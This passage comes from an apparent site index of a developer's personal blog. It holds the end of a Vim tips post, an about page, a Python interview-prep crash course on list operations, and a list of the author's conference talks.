go to the first line you want to comment, press Ctrl V. This will put the editor in the VISUAL BLOCK mode.\nNow using the arrow key, select up to the last line you want commented. Now press Shift i, which will put the editor in INSERT mode and then press #.\nThis will add a hash to the first line. (if this was a C file, just type //). Then press Esc (give it a second), and it will insert a # character on all other selected lines.\u0026rdquo;\nUn-commenting is nearly the same, but in opposite order using the visual block mode!\nTime traveling! Yes, you heard that right, vim makes time travel possible! Note, this ONLY works within current Vim sessions. So, if you exit vim, you will lose your current session\u0026rsquo;s stack of edits.\nOn the Vim command palette, which you can enter from Normal mode by hitting the colon :, you can type \u0026rsquo;earlier\u0026rsquo; and \u0026rsquo;later\u0026rsquo; to go back and forth in your current session stack of edits. This is super helpful if you need to revert a few small changes you\u0026rsquo;ve made in the last minute or want to revert everything you did in the last hour. Or if you decide you do want those changes, go forward in time too!\n:earlier 3m :later 5s Plugins One of the reasons Vim is so great is that there are TONS of awesome plugins for Vim. If you\u0026rsquo;re having a hard time scripting something on your own with vimscript, there\u0026rsquo;s probably a plugin for it! They range anywhere from super useful to super silly. Some of my favorites include the file system NERD tree, the fugitive git client, and ordering pizza with Vim Pizza (yes that\u0026rsquo;s right, you can order pizza with Vim! It can really do it all!)\nCheck out this great resource for discovering Vim plugins, instructions to install them, and buzz around the Vim community.\nConclusion: This by no means is a comprehensive guide. There are a ton of great resources for Vim out there and its capabilities. This guide should serve more as a small taste to what Vim can do and maybe peaked your interest to learning more about it.\nTake heart! Vim has a steep learning curve, and, like any complex tool set, it takes alot of time and practice to get good with. Google is your friend here.\nFeel free to reach out to me if something from this guide was not super clear!\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/legacy/vim-tips/","summary":"(Note: this is a post from a legacy blog. This post was intended to help new OSU students get started with Vim)\nI\u0026rsquo;d consider myself some sort of Vim - evangelist. It\u0026rsquo;s an incredible tool and has ALOT of power. If there\u0026rsquo;s something you wish Vim could do, there\u0026rsquo;s probably a plugin for it or a way to make Vim do it with scripting (in its own language!). Moderate proficiency in Vim is a skill that nearly every developer could benefit from.","title":"Vim Tips!"},{"content":"Hi there! 🌊 My name is John \u0026amp; I\u0026rsquo;m a senior software engineer at OpenSauced where I\u0026rsquo;m building open source insights tooling.\nIn the past, I\u0026rsquo;ve worked at AWS, VMware, \u0026amp; Pivotal Cloud Foundry where I worked on open source software, observability \u0026amp; SRE tooling, Kubernetes, Linux operating systems, and cloud technologies.\nThis site is my personal landing page and blog. You\u0026rsquo;ll find all kinds of stuff here: stuff about tech, short stories, long-form essays, photos, music, videos, ramblings on philosophy, and really, whatever I want (it\u0026rsquo;s my website after all).\nAll opinions and views herein are my own opinions and do not reflect those of any employer (past, present, future, or inter-dimensional).\nEnjoy!\nContact I can be reached directly at hello.john.codes@gmail.com\nSupport If you find any of the open source work I\u0026rsquo;ve done valuable, please consider supporting me via GitHub sponsors.\nYou can find my personal public PGP here. Use it to send me secret messages or verify my identity online.\n","permalink":"https://johncodes.com/about/","summary":"Hi there! 🌊 My name is John \u0026amp; I\u0026rsquo;m a senior software engineer at OpenSauced where I\u0026rsquo;m building open source insights tooling.\nIn the past, I\u0026rsquo;ve worked at AWS, VMware, \u0026amp; Pivotal Cloud Foundry where I worked on open source software, observability \u0026amp; SRE tooling, Kubernetes, Linux operating systems, and cloud technologies.\nThis site is my personal landing page and blog. You\u0026rsquo;ll find all kinds of stuff here: stuff about tech, short stories, long-form essays, photos, music, videos, ramblings on philosophy, and really, whatever I want (it\u0026rsquo;s my website after all).","title":""},{"content":"The No Nonsense Interview Prep The following is interview preperation material for software engineer and development roles that covers the most common aspects of data structures, algorithms, design, and behavioral.\nThis interview manual is ever evolving; I make changes to it frequently as my experience grows and I find new resources.\nPython Crash Course But why Python? Basic operations Data structures Arrays Python Crash Course The following is a crash course in Python that I\u0026rsquo;ve used to refresh my knowledge and understanding of the langauge from a high level.\nBut why Python? The last thing you want to do during a technical white board interview is stumble over weird or complicated syntax, forget how some library works, or waste time sketching out alot of boilerplate.\nFurther, because of how close python is to normal spoken language, even if the person interviewing you doesn\u0026rsquo;t have a firm grasp of python, they will understand what you\u0026rsquo;re trying to do.\nIn short, it\u0026rsquo;s all about communication. Python is easy to communicate, reason about, simple to understand, and reduces the overall complexity of your technical interview.\nPython is just really simple and un-complicated.\nBasic operations Data structures Arrays # initializing arrays with array values arr = [1, 2, 3] # Use `append()` to insert a new value at end of the array. # This is a O(1) operation but may require that we # grow the underlying datastructure to accommodate the new element. # # An understand of how arrays \u0026#34;grow\u0026#34; under the hood as we add elements # is a necessary part of understanding the time complexity of using arrays. arr.append(4); # Use insert() to insert a value at a specific position. # This inserts 5 at the 2nd position. This is NOT zero indexed. # This is a O(n) operation in the worst case given all elements # may need to be \u0026#34;shifted\u0026#34; or the underlying array may need to grow arr.insert(2, 5) # We can perform an in place sort. # The `arr` will now be sorted. arr.sort() # This returns a sorted copy where `arr` is not mutated. sorted(arr) # You may apply a lambda to the sorting. # # A lambda is essentially an \u0026#34;anonymous\u0026#34; function # that can take any arbitrary number of inputs. # # This example uses an arbitrary \u0026#34;student\u0026#34; class # that has some \u0026#34;grade_point_average\u0026#34; data member. # # For the `.sort()` method, we can supply a key # and in this example, use the student\u0026#39;s gradepoint averages student.sort(key=lambda student: student.grade_point_average) # Reverses the array. # Ever get a \u0026#34;reverse string\u0026#34; question? Just use this! arr.reverse() # Returns the index of the first occurrence of the given element. arr.index(2) # Removes the first occurence of the given element arr.remove(2) # Returns true if element is in the array # The time complexity of this is O(n) in order to scan the whole array if 2 in arr: print(\u0026#39;2 is in the array!\u0026#39;) # Creates a shallow copy (where compound objects are only REFERENCES, not deep copies) copy.copy(arr) # Creates a deep copy which recursively inserts copies of any nest, compound objects # Most of the time, during interview quetsions, you probably want a deep copy copy.deepcopy(arr) # Returns the minimum element within the array min(arr) # Returns the maximum element within the array max(arr) # Slicing is very useful where array[start:stop:step] # So, for example, this prints the array starting at the second element # and going in reverse order. It\u0026#39;d look something like \u0026#34;[2, 1]\u0026#34; print(arr[1::-1]) # List comprehension in python is also super powerful during interviews. # You need 3 things to do list comprehension: # 1. And input sequence # 2. An iterator # 3. A logical condition # # Wrap all of that in the `[ ]` array syntax # and you\u0026#39;ll end up with a new array. # In this example, we are taking x to the power of 2 # where x is the list of number from 0 to 5 # but we only take numbers if they are modulo % 2. # All this in one line! [x**2 for x in range(6) if x % 2 == 0] ","permalink":"https://johncodes.com/interview-prep/","summary":"The No Nonsense Interview Prep The following is interview preperation material for software engineer and development roles that covers the most common aspects of data structures, algorithms, design, and behavioral.\nThis interview manual is ever evolving; I make changes to it frequently as my experience grows and I find new resources.\nPython Crash Course But why Python? Basic operations Data structures Arrays Python Crash Course The following is a crash course in Python that I\u0026rsquo;ve used to refresh my knowledge and understanding of the langauge from a high level.","title":""},{"content":"Talks Inquires: talks@johncodes.com\n2023 Kubecon NA: Hacking the Kubernetes Secure Software Supply-chain with .zip Domains Neovim Conf 2023: Introducing nvim-llama PancakesCon 4: Containers, Hardening Against Escapes, and Funk Bass 2022 KubeCon EU: The Risks of Single Maintainer Dependencies Business of Open Source: Exploring the Risks of Single Maintainer Dependencies with John McBride NeovimConf 2022: Lua, A Primer Deserted Island DevOps 2022: Distributed Shared Team Configurations With Oh-My-Zsh 2023 Kubecon NA: Hacking the Kubernetes Secure Software Supply-chain with .zip Domains Neovim Conf 2023: Introducing nvim-llama PancakesCon 4: Containers, Hardening Against Escapes, and Funk Bass I spoke at Stackoverflow\u0026rsquo;s cyber-security and red-team conference, PankcakesCon. In this talk, I discuss Bottlerocket, a Linux based operating system designed for running containers, as a use case for hardening container based environments against attack.\n2022 KubeCon EU: The Risks of Single Maintainer Dependencies I spoke at Kubecon EU 2022 on my experience maintaining spf13/cobra, an extremely important software project in the cloud-native ecosystem, with just a small group of other contributors.\nBusiness of Open Source: Exploring the Risks of Single Maintainer Dependencies with John McBride During my time in Spain for Kubecon EU \u0026lsquo;22, I also appeared on the \u0026ldquo;Business of Open Source\u0026rdquo; podcast to discuss maintaining cobra and what startups considering opening sourcing their technologies can learn.\nYou can listen to the episode here.\nNeovimConf 2022: Lua, A Primer Configuring Nvim via Lua is a powerful, native, and fast way to get your Nvim editor environment just how you like it. But what IS Lua?\nWell, in this talk, we\u0026rsquo;ll explore the essentials of this amazing \u0026amp; simple language. You\u0026rsquo;ll learn how to use it effectively within Nvim, how to create a simple Lua plugin, and how to use it on it\u0026rsquo;s own via it\u0026rsquo;s interpreter.\nDeserted Island DevOps 2022: Distributed Shared Team Configurations With Oh-My-Zsh Team knowledge, configurations, and infrastructure access can be challenging in a distributed world. Have you ever asked “what’s that command we use?” or “Where are the secrets to access that environment?” - well this talk is for you!\nIn this talk, I explore using Oh-My-Zsh, a powerful Zsh configuration framework, in order to share team knowledge, distribute common configurations, and share infrastructure access. I also discuss the real world scenario this use case emerged from, challenges faced in this approach, and how you can leverage Oh-My-Zsh for your distributed devops teams.\n","permalink":"https://johncodes.com/talks/","summary":"Talks Inquires: talks@johncodes.com\n2023 Kubecon NA: Hacking the Kubernetes Secure Software Supply-chain with .zip Domains Neovim Conf 2023: Introducing nvim-llama PancakesCon 4: Containers, Hardening Against Escapes, and Funk Bass 2022 KubeCon EU: The Risks of Single Maintainer Dependencies Business of Open Source: Exploring the Risks of Single Maintainer Dependencies with John McBride NeovimConf 2022: Lua, A Primer Deserted Island DevOps 2022: Distributed Shared Team Configurations With Oh-My-Zsh 2023 Kubecon NA: Hacking the Kubernetes Secure Software Supply-chain with .","title":""}]